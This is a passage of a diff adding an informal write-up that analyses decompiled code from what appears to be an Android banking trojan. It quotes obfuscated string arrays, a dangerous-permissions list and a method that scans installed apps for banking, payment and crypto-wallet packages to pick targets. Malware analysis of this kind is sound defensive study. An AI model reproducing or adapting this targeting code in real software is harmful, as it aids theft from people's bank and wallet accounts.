::[cs]Systém nemusí pracovat správně, zakažte ::[sv]Systemet inte fungerar korrekt, inaktivera ::[gd]Tha an siostam a ' dèanamh nach eil ag obair mar bu chòir, cuir seo à comas ::[eo]La sistemo ne funkcias korekte, malebligi ::[et]Süsteem ei tööta nõuetekohaselt, lülitage välja ::[jv]Sistem ora bisa bener, mateni ::[ja]システムの攻撃により正常に動作しなくなったり、無効に:".split("::");
+
+    /* renamed from: r */
+    public static final String[] f331r = ":[az]Продождить::[sq]Për protoedit::[am]ጋር protoedit::[en]Сontinue::[ar]إلى protoedit::[hy]Продождить::[af]Om te protoedit::[eu]Nahi protoedit::[ba]Продождить::[be]Продождить::[bn]করতে protoedit::[my]အ protoedit::[bg]Продождить::[bs]Da protoedit::[cy]I protoedit::[hu]Hogy protoedit::[vi]Để protoedit::[ht]Pou protoedit::[gl]Para protoedit::[nl]Om protoedit::[mrj]Продождить::[el]Продождить::[ka]უნდა protoedit::[gu]માટે protoedit::[da]At protoedit::[he]כדי protoedit::[yi]צו protoedit::[id]Untuk protoedit::[ga]A protoedit::[is]Að protoedit::[es]Продождить::[it]Продождить::[kk]Продождить::[kn]ಗೆ protoedit::[ca]Сontinue::[ky]Продождить::[zh]到protoedit::[ko]을 protoedit::[xh]Ukuba protoedit::[km]ដើម្បី protoedit::[lo]ການ protoedit::[la]Ad protoedit::[lv]Продождить::[lt]Продождить::[lb]Продождить::[mk]Да protoedit::[mg]Mba protoedit::[ms]Untuk protoedit::[ml]To protoedit::[mt]Biex protoedit::[mi]Ki te protoedit::[mr]To protoedit::[mhr]Продождить::[mn]To protoedit::[de]Продождить::[ne]गर्न protoedit::[no]For å protoedit::[pa]ਕਰਨ ਲਈ protoedit::[pap]Продождить::[fa]به protoedit::[pl]Продождить::[pt]Продождить::[ro]Продождить::[ru]Продождить::[ceb]Sa protoedit::[sr]Продождить::[si]කිරීමට protoedit::[sk]Na protoedit::[sl]Za protoedit::[sw]Kwa protoedit::[su]Pikeun protoedit::[tl]Sa protoedit::[tg]Продождить::[th]ต้อง protoedit::[ta]To protoedit::[tt]Продождить::[te]కు protoedit::[tr]Продождить::[udm]Продождить::[uz]Uchun protoedit::[uk]Продождить::[ur]کرنے کے لئے protoedit::[fi]Voit protoedit::[fr]Продождить::[hi]करने के लिए protoedit::[hr]Продождить::[cs]Продождить::[sv]Att protoedit::[gd]Gu protoedit::[eo]Al protoedit::[et]Продождить::[jv]Kanggo protoedit::[ja]にprotoedit:".split("::");
+
+```
+
+here, we can see some random bullshit strings, in various languages and each assigned to a string array. 
+
+little below that, another two string arrays are declared, both size equal to `62`, and the first one is assigned with each letter of the english alphebet + some characters and the the other is assigned with the chinese alphebet (i dont know if there's chinese alphebet).
+
+```java
+public String[] permissions = {"android.permission.SEND_SMS", "android.permission.WRITE_EXTERNAL_STORAGE", "android.permission.READ_CONTACTS", "android.permission.ACCESS_FINE_LOCATION", "android.permission.CALL_PHONE", "android.permission.RECORD_AUDIO"};
+```
+
+then there is this string array (which, i renamed) specifying the permissions reqested by the apk.
+
+```java
+public String mo206a(Context context) {
+        String str = "";
+        for (ApplicationInfo applicationInfo : context.getPackageManager().getInstalledApplications(128)) {
+            if (applicationInfo.packageName.equals("at.spardat.bcrmobile")) {
+                str = str + "at.spardat.bcrmobile,";
+            }
+            if (applicationInfo.packageName.equals("at.spardat.netbanking")) {
+                str = str + "at.spardat.netbanking,";
+            }
+            if (applicationInfo.packageName.equals("com.bankaustria.android.olb")) {
+                str = str + "com.bankaustria.android.olb,";
+            }
+            
+            [... shit tons of stuff more]
+
+            if (applicationInfo.packageName.equals("com.kryptokit.jaxx")) {
+                str = str + "com.kryptokit.jaxx(Crypt),";
+            }
+        }
+        if (str.contains("com.paypal.android.p2pmobile,")) {
+            str = str.replace("com.paypal.android.p2pmobile,", "") + "com.paypal.android.p2pmobile,";
+        }
+        if (str.contains("com.amazon.mShop.android.shopping,")) {
+            str = str.replace("com.amazon.mShop.android.shopping,", "") + "com.amazon.mShop.android.shopping,";
+        }
+        if (!str.contains("com.ebay.mobile,")) {
+            return str;
+        }
+        return str.replace("com.ebay.mobile,", "") + "com.ebay.mobile,";
+    }
+```
+
+at the top, the method declares string `str` and initliaze it to an empty string. 
+then it iterates through each installed application and compares the application's name with a shit ton of string, which are basically names of banking apps.
+if the current application's name is equal to one of those strings, string `str` is appended with the name followed by a comma.
+
+when the iteration is finished, it checks if `str` contains following names
+
+    - com.paypal.android.p2pmobile
+    - com.amazon.mShop.android.shopping
+    - com.ebay.mobile
